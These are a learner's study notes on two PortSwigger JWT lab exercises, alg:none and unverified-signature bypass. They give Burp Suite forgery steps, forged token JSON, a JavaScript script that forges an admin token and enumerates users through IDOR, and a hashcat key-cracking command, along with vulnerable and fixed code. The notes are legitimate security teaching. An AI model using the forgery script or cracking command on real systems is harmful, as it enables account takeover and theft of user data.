# Day 30 Notes — JWT Attacks

## 1. What We Did Today Overview

- Studied **JWT (JSON Web Token)** authentication vulnerabilities on PortSwigger Web Security Academy
- Used **Burp Suite** (Proxy, HTTP History, Repeater, Inspector) as the primary interception and manipulation tool
- Completed **Lab 1 — JWT authentication bypass via unverified signature**
- Completed **Lab 2 — JWT authentication bypass via flawed signature verification (alg:none attack)**
- Successfully accessed admin panels and deleted target users by forging JWT tokens
- Zero hints used across both labs

---

## 2. The Foundation — Why This Vulnerability Exists

### Part A — Root Cause

The developer building a JWT-based authentication system made one correct decision and one catastrophic assumption. The correct decision was to use a signed token instead of a server-side session — this is genuinely better for scalability because the server does not need to remember anything between requests. The catastrophic assumption was trusting the token's content after only partially — or in some cases never — verifying its integrity.

JWT authentication works like this: the server issues a token when you log in, you send that token with every subsequent request, and the server reads your identity from the token's payload. For this to be secure, the server must verify that the signature attached to the token is valid — meaning it was produced by the server itself using a secret key. If that verification step is skipped, performed incorrectly, or can be bypassed by changing the algorithm in the header, then the token's payload can be freely modified by an attacker. The server then reads attacker-controlled data as if it were trusted.

The developer failed at the boundary between trust and verification. They built a system that is supposed to verify before trusting, but the verification is either absent or exploitable.

### Part B — The Mental Model

Imagine a concert venue that issues wristbands at the entrance. The wristband has your name and ticket tier (general admission or VIP) printed on it, along with a tamper-proof holographic seal. The rule is: security at the VIP door must check the holographic seal before reading the name.

**Lab 1** is equivalent to the VIP door security guard not checking the holographic seal at all — they just read whatever name is on the wristband. You can peel the original wristband off, write "VIP — Administrator" on a blank strip of paper, and walk straight in.

**Lab 2** is equivalent to the guard accepting wristbands that say "no seal required" on them — as if the wristband itself gets to declare whether it should be verified. You write your own wristband, mark it "seal: none", change your name to administrator, and the guard still lets you through.

### Part C — Three Conditions Required for Exploitation

For a JWT vulnerability to be exploitable, three things must be true simultaneously:

**Condition 1:** The application uses JWTs to make authorization decisions — specifically, it reads a claim from the token payload (like `sub`, `username`, or `role`) and uses that to determine what the user is allowed to do.

**Condition 2:** The signature verification is either absent (Lab 1) or bypassable through attacker-controlled input like the `alg` header parameter (Lab 2).

**Condition 3:** The attacker can intercept or obtain a legitimate token to use as a template for forgery. This is almost always possible because JWTs are sent in HTTP headers or cookies that Burp can capture.

### Part D — What JWT Attacks Can and Cannot Do

**JWT attacks CAN:**
- Escalate privileges from a normal user to administrator
- Impersonate any user whose username or ID you know (or can guess)
- Bypass authorization controls entirely if the verification is absent
- Access admin panels, delete users, read private data — anything the impersonated account can do

**JWT attacks CANNOT:**
- Bypass authentication if the server does not use JWTs at all (session cookies are a different attack surface)
- Work if the signing key is strong, the algorithm is enforced server-side, and verification is implemented correctly
- Persist across key rotation — if the server changes its signing secret, all previously forged tokens become invalid

---

## 3. Lab 1 — JWT Authentication Bypass via Unverified Signature

### The Setup

The lab application uses JWT session cookies to manage authentication. After logging in, every request to protected endpoints carries a JWT in the session cookie. The `/admin` panel is restricted to the `administrator` user. When a normal user tries to access `/admin`, the application reads the `sub` claim from the JWT payload and denies access because the value is `wiener`, not `administrator`.

### The Steps Performed

1. Logged in to the application using the provided credentials.
2. In Burp Suite, navigated to **Proxy > HTTP History** and located the post-login `GET /my-account` request. The session cookie contained a JWT.
3. Double-clicked the payload segment of the JWT in Burp's **Inspector panel** to view it decoded. The `sub` claim was set to the username `wiener`.
4. Sent the `GET /my-account` request to **Burp Repeater**.
5. Changed the path in Repeater to `/admin` and sent the request. The response confirmed that the admin panel is only accessible to the `administrator` user.
6. In the Inspector panel, changed the value of the `sub` claim from `wiener` to `administrator` and clicked **Apply changes**. Burp automatically re-encoded the payload segment.
7. Sent the modified request to `/admin`. The admin panel was returned in the response.
8. Located the URL `/admin/delete?username=carlos` in the response and sent a request to that endpoint to complete the lab.

### Why It Worked — Technical Explanation

A JWT has three parts separated by dots: `header.payload.signature`. The signature is computed by the server using a secret key applied to the header and payload. The purpose of the signature is to guarantee that the header and payload have not been tampered with since the server issued the token.

In a correctly implemented system, changing the `sub` claim from `wiener` to `administrator` would invalidate the signature. The server would detect the mismatch and reject the token.

In this lab, the server reads the `sub` claim and uses it to make authorization decisions, but it **never checks the signature at all**. The verification step simply does not happen. This means the signature portion of the token is completely decorative — it exists in the token but the server never looks at it.

Before modification, the payload decoded to:
```json
{
  "iss": "portswigger",
  "sub": "wiener",
  "exp": 1749999999
}
```

After modification, the payload decoded to:
```json
{
  "iss": "portswigger",
  "sub": "administrator",
  "exp": 1749999999
}
```

The server received this token, skipped signature verification, read `sub: administrator`, and granted full admin access. The signature from the original `wiener` token was still attached — completely invalid — but the server never checked.

### What This Proves

This output confirms that the server makes authorization decisions based entirely on the JWT payload without verifying that the payload was issued and signed by the server itself.

---

## 4. Lab 2 — JWT Authentication Bypass via Flawed Signature Verification (alg:none)

### The Setup

Same application structure as Lab 1 — JWT session cookies, `/admin` panel restricted to `administrator`. The difference is that this server does perform some level of signature verification. However, the verification logic is flawed: it trusts the `alg` parameter in the JWT header, which is attacker-controlled.

### The Steps Performed

1. Logged in to the application using the provided credentials.
2. In Burp, located the post-login `GET /my-account` request in **Proxy > HTTP History**. The session cookie contained a JWT.
3. Double-clicked the payload segment in the **Inspector panel** to confirm the `sub` claim was set to the current username.
4. Sent the request to **Burp Repeater** and changed the path to `/admin`. The response confirmed admin access is restricted.
5. Selected the **payload** of the JWT in Inspector, changed the value of `sub` to `administrator`, and clicked **Apply changes**.
6. Selected the **header** of the JWT in Inspector, changed the value of the `alg` parameter from `HS256` to `none`, and clicked **Apply changes**.
7. In the message editor, removed the signature from the JWT while keeping the trailing dot after the payload. The token structure became: `header.payload.` (note the trailing dot with nothing after it).
8. Sent the request. The admin panel was returned in the response.
9. Found the URL `/admin/delete?username=carlos` in the response and sent a request to that endpoint to solve the lab.

### Why It Worked — Technical Explanation

The JWT specification defines an algorithm field (`alg`) in the header that tells the server which cryptographic algorithm was used to generate the signature. Common values are `HS256` (HMAC with SHA-256) and `RS256` (RSA with SHA-256). The specification also allows a value of `none`, which means no signature is applied and no verification should be performed.

The attack exploits a server that reads the `alg` value from the token header — which is attacker-controlled — and uses that to decide how to verify the token. By setting `alg` to `none`, the attacker instructs the server to skip signature verification entirely.

The original JWT header before modification:
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

The forged JWT header after modification:
```json
{
  "alg": "none",
  "typ": "JWT"
}
```

The forged JWT payload after modification:
```json
{
  "iss": "portswigger",
  "sub": "administrator",
  "exp": 1749999999
}
```

The resulting token sent to the server:
```
[base64url(header)].[base64url(payload)].
```

The trailing dot is critical. JWT format requires three segments separated by dots. If the dot is missing, the server may reject the token as malformed before even attempting to parse it. The dot is present, but the signature segment is empty — consistent with `alg: none`.

The server received this token, read `alg: none` from the header, applied no signature verification, read `sub: administrator` from the payload, and granted admin access.

### What This Proves

This confirms that the server's verification logic trusts attacker-supplied input (the `alg` header) to determine how to verify the token — a fundamental design flaw where the thing being verified gets to control how it is verified.

---

## 5. Vulnerable Source Code — Line by Line

The following represents the flawed JWT verification logic pattern that underlies both lab vulnerabilities. This is a generic Node.js/JavaScript pattern — the actual lab server code is not accessible, but this accurately represents the mistake.

**Lab 1 — Missing Verification:**

```javascript
// Vulnerable pattern — Lab 1
function getUserFromToken(token) {
    const parts = token.split('.');
    const payload = JSON.parse(atob(parts[1]));
    // No signature verification at all
    // The payload is decoded and trusted directly
    return payload.sub; // Returns "administrator" if attacker changed it
}
```

Line by line:
- `token.split('.')` — splits the JWT into its three segments (header, payload, signature)
- `JSON.parse(atob(parts[1]))` — base64-decodes and JSON-parses the payload segment
- The signature (`parts[2]`) is never used — it is ignored entirely
- `return payload.sub` — the application trusts whatever value is in `sub` without any verification that the token is authentic

The fixed version of this function would call a JWT library's `verify()` method with the server's secret key before accessing any payload claims.

**Lab 2 — Algorithm Confusion:**

```javascript
// Vulnerable pattern — Lab 2
function verifyToken(token, secretKey) {
    const parts = token.split('.');
    const header = JSON.parse(atob(parts[0]));
    const algorithm = header.alg; // Reads algorithm FROM THE TOKEN — attacker controlled

    if (algorithm === 'none') {
        // No verification needed — just parse the payload
        return JSON.parse(atob(parts[1]));
    }

    // Otherwise verify with the specified algorithm
    return jwt.verify(token, secretKey, { algorithms: [algorithm] });
}
```

Line by line:
- `header.alg` — reads the algorithm from the attacker-controlled header segment
- `if (algorithm === 'none')` — explicitly handles the `none` case by skipping verification entirely
- This means an attacker who sets `alg: none` in their forged token hits this branch and bypasses all verification
- The fix is to hardcode the expected algorithm server-side and never read it from the token: `jwt.verify(token, secretKey, { algorithms: ['HS256'] })`

---

## 6. What Failed and Why

No significant failures occurred during these labs. Both labs were completed following the steps without needing hints or alternative approaches.

One point of potential confusion worth documenting: in Lab 2, removing the signature while forgetting the trailing dot would cause the token to be rejected as malformed before the server even attempts to parse the algorithm. The token must maintain the three-segment structure `header.payload.` — the third segment is empty but the delimiter must be present. This is a formatting requirement of the JWT specification, not a security check.

---

## 7. Chain Thinking

### The Chain

```
JWT Forgery (alg:none or unverified signature)
        ↓
Full authentication bypass — attacker becomes administrator
        ↓
Admin panel access — user enumeration, data exposure, admin functions
        ↓
Account deletion, data exfiltration, or privilege persistence
        ↓
Combined with IDOR: use forged admin token to access other users'
private data via predictable user IDs
```

### Severity Upgrade

JWT forgery alone is rated **Critical (CVSS 9.1+)** because it provides complete authentication bypass. However, the actual impact depends on what the admin panel exposes.

If the admin panel reveals other users' profile data and those profiles are accessible via predictable IDs (IDOR), the chain becomes:

1. Forge JWT → become administrator
2. Use admin token to enumerate users via `/admin/users` or similar
3. Use those user IDs to access private data via IDOR on user-specific endpoints

This chain converts an authentication bypass into a **full account takeover + data breach** affecting every user in the system.

### Combined Attack Code Pattern

```javascript
// Step 1: Forge the JWT (attacker's code, running locally)
const header = btoa(JSON.stringify({ alg: "none", typ: "JWT" }))
    .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');

const payload = btoa(JSON.stringify({
    iss: "portswigger",
    sub: "administrator",
    exp: Math.floor(Date.now() / 1000) + 3600
})).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');

const forgedToken = `${header}.${payload}.`; // trailing dot, empty signature

// Step 2: Use forged token to enumerate users
fetch('/admin/users', {
    headers: { 'Cookie': `session=${forgedToken}` }
})
.then(res => res.json())
.then(users => {
    // Step 3: Use IDOR to access each user's private data
    users.forEach(user => {
        fetch(`/api/user/${user.id}/profile`, {
            headers: { 'Cookie': `session=${forgedToken}` }
        });
    });
});
```

---

## 8. Real World Context

In 2022, a critical JWT vulnerability was disclosed affecting **Palo Alto Networks PAN-OS**, where improper verification of JWT tokens allowed unauthenticated attackers to access management interfaces. The impact was rated Critical and required emergency patching across enterprise firewalls globally.

On HackerOne, JWT authentication bypass vulnerabilities typically pay between **$3,000 and $25,000** depending on the application's sensitivity and the impact of the bypass. When the bypass leads to admin access or affects a high-value target (financial, healthcare, infrastructure), payouts at the high end of this range or beyond are common.

JWT vulnerabilities remain common despite being well-documented because the JWT specification itself is complex and has historically had ambiguous guidance on algorithm handling. Many developers integrate JWT libraries without reading the security-critical sections of the documentation. Additionally, older versions of popular JWT libraries (including `jsonwebtoken` for Node.js) had the `alg:none` vulnerability by default — applications built on those versions and not updated remain vulnerable.

---

## 9. The Fix

### Vulnerable Code Pattern (Generic)

```javascript
// VULNERABLE — trusts algorithm from token header
function verifyJWT(token, secret) {
    const decoded = jwt.decode(token); // only decodes, does not verify
    return decoded.payload;
}

// ALSO VULNERABLE — allows attacker-specified algorithm
function verifyJWT(token, secret) {
    const header = JSON.parse(atob(token.split('.')[0]));
    return jwt.verify(token, secret, { algorithms: [header.alg] });
}
```

### Fixed Code

```javascript
// CORRECT — algorithm is hardcoded server-side, never read from token
function verifyJWT(token, secret) {
    try {
        // algorithms array is defined by the server, not the token
        const payload = jwt.verify(token, secret, {
            algorithms: ['HS256'], // hardcoded — attacker cannot change this
            issuer: 'your-app-name', // verify the issuer claim
        });
        return payload;
    } catch (err) {
        // Any verification failure — expired, tampered, wrong algorithm — throws
        throw new Error('Invalid token');
    }
}
```

### Why the Fix Works

The fix works because the algorithm used for verification is now determined entirely by server-side configuration, not by anything in the token. Even if an attacker sends a token with `alg: none` or `alg: HS256` when the server expects `RS256`, the `jwt.verify()` call will reject the token because the algorithm in the token does not match the hardcoded expected algorithm. The attacker has no control over this comparison.

Using `jwt.decode()` instead of `jwt.verify()` is a common mistake — `decode()` only base64-decodes the token without any cryptographic verification. It is useful for reading claims from a token you have already verified, but using it as the primary way to read claims is equivalent to having no verification at all.

### Defense in Depth

Beyond fixing the verification logic, a complete defense includes:

**Short expiry times:** JWT tokens should have short lifetimes (15–60 minutes). A stolen or forged token has a limited window of usefulness.

**Token revocation via allowlist or denylist:** Maintain a server-side store of valid token IDs (JTI claim). When a user logs out, add their token's JTI to a denylist. This eliminates the "stateless" advantage of JWTs for sensitive operations but prevents token reuse after logout.

**Strict claim validation:** Verify not just the signature but also `iss` (issuer), `aud` (audience), and `exp` (expiry). An attacker who can forge tokens with future expiry times extends their attack window significantly.

**Use asymmetric keys (RS256) for high-value applications:** With RS256, the private key used to sign tokens never leaves the server. Compromise of the verification public key does not allow an attacker to forge tokens.

### What Does NOT Fix It

Validating the token format (checking that it has three segments separated by dots) does not fix the vulnerability — a forged token has valid format.

Checking the `typ` header claim (`"typ": "JWT"`) does not fix it — the `typ` claim is also attacker-controlled and part of the unsigned header.

Using HTTPS does not fix JWT forgery — HTTPS protects the token in transit but does not prevent an attacker from modifying a token they already possess (captured via Burp or obtained through other means).

---

## 10. Key Concepts Summary

| Term | Meaning |
|---|---|
| **JWT** | A token format for transmitting user identity between client and server, consisting of three base64url-encoded parts separated by dots |
| **Header** | The first part of a JWT — contains the token type and the algorithm used to generate the signature |
| **Payload** | The second part of a JWT — contains the claims (user data like username, role, expiry time) |
| **Signature** | The third part of a JWT — a cryptographic value that proves the header and payload were not tampered with |
| **sub claim** | "Subject" — a standard JWT claim used to store the user's identifier, typically a username or user ID |
| **alg parameter** | Field in the JWT header declaring which algorithm was used to sign the token — in flawed implementations, reading this from the token is the root of algorithm confusion attacks |
| **alg:none** | A JWT algorithm value meaning no signature is required — exploited when servers accept tokens that declare their own algorithm and allow none |
| **HS256** | HMAC with SHA-256 — a symmetric signing algorithm where the same secret key is used to both sign and verify tokens |
| **RS256** | RSA with SHA-256 — an asymmetric algorithm where a private key signs tokens and a public key verifies them |
| **Unverified signature** | A vulnerability where the server decodes the JWT payload and trusts it without performing any cryptographic verification of the signature |
| **Algorithm confusion** | An attack where the attacker changes the alg header to trick the server into using the wrong verification method |
| **jwt.decode()** | A function that only base64-decodes a JWT without verifying the signature — dangerous if used to make security decisions |
| **jwt.verify()** | A function that decodes AND cryptographically verifies a JWT — the correct function for authentication |
| **Inspector panel** | A Burp Suite feature that automatically detects and decodes JWT tokens in requests, allowing claims to be edited without manual base64 manipulation |
| **Trailing dot** | The empty third segment delimiter in a forged alg:none token — required to maintain valid JWT structure even when no signature is present |

---

## 11. Payloads and Commands Reference

```bash
# JWT structure (conceptual)
# [base64url(header)].[base64url(payload)].[base64url(signature)]
# For alg:none attack — empty third segment with trailing dot:
# [base64url(header)].[base64url(payload)].
```

```json
// Original JWT header (before attack)
{
  "alg": "HS256",
  "typ": "JWT"
}

// Modified JWT header for alg:none attack
{
  "alg": "none",
  "typ": "JWT"
}
```

```json
// Original JWT payload (before attack)
{
  "iss": "portswigger",
  "sub": "wiener",
  "exp": 1749999999
}

// Modified JWT payload for privilege escalation
{
  "iss": "portswigger",
  "sub": "administrator",
  "exp": 1749999999
}
```

```
// Lab 1 — Burp Repeater steps
1. Proxy > HTTP History > find GET /my-account post-login
2. Send to Repeater
3. Change path: /my-account → /admin
4. Inspector panel > double-click payload segment
5. Change "sub": "wiener" → "sub": "administrator"
6. Click Apply changes
7. Send request — admin panel returned
8. Find /admin/delete?username=carlos in response
9. Send request to that path — lab solved
```

```
// Lab 2 — Burp Repeater steps (alg:none)
1. Same setup as Lab 1
2. Inspector panel > payload segment > change sub to administrator > Apply
3. Inspector panel > header segment > change alg to none > Apply
4. In message editor: delete everything after the second dot (the signature)
5. Ensure trailing dot remains: header.payload.
6. Send request — admin panel returned
7. Find /admin/delete?username=carlos and send to solve
```

```bash
# Tool reference
# jwt.io — paste any JWT to decode header, payload, signature visually
# Burp Inspector panel — right-click any JWT in request > Inspector shows decoded segments
# hashcat (for Lab 3 — weak key brute force, not covered today)
hashcat -a 0 -m 16500 captured_token.txt /usr/share/wordlists/rockyou.txt
```

---

## 12. Foundation Checklist

**Can you explain what causes JWT authentication bypass — not what it is, but why it exists?**
The developer separated token issuance from token verification, or allowed the token itself to control how it is verified. The root cause is trusting attacker-controlled data (the alg header, or the payload without signature check) to make authorization decisions.

**Can you perform this attack manually in Burp without using any automated tools?**
Yes — the entire attack requires only Burp Repeater and the Inspector panel. No extensions, no scripts. Decode the JWT, change the sub claim, change the alg header, remove the signature, add the trailing dot, send.

**Can you explain JWT forgery to a developer who has never heard of it, in two minutes, without using the words "exploit" or "bypass"?**
Your application issues a signed token when I log in. The signature is supposed to prove the token is genuine. If your code reads my username from the token without checking the signature, I can change my username to administrator and your server will treat me as one. If your code reads the algorithm from the token to decide how to verify it, I can set the algorithm to "none" and your server will skip verification entirely.

**Can you describe two real-world scenarios where a JWT vulnerability would have catastrophic impact?**
First: a SaaS platform where the JWT payload contains a `role` claim (`user`, `admin`, `superadmin`). Forging a superadmin token gives the attacker access to all customer data and billing information across every tenant. Second: a banking application where the JWT contains an `account_id` claim. Changing this claim allows the attacker to view and initiate transactions on any account in the system.

**Can you chain JWT forgery with at least one other vulnerability and explain what the combined impact is?**
JWT forgery combined with IDOR: forge a token to become administrator, use the admin panel to enumerate all user IDs, then use those IDs in IDOR-vulnerable user-specific API endpoints to extract private data for every user. JWT forgery alone gives you admin access. IDOR alone gives you one other user's data if you can guess their ID. Combined, you get all users' data without any guessing.

**Can you explain why hardcoding the algorithm server-side fixes the vulnerability, and why checking the token format does not?**
Hardcoding the algorithm works because the verification logic is no longer influenced by any attacker-controlled data. The server decides how to verify the token before looking at anything in the token. Checking the token format does not fix it because a forged token has perfectly valid format — three segments, correct base64url encoding, valid JSON in header and payload. The format is correct; the content is malicious.

---

 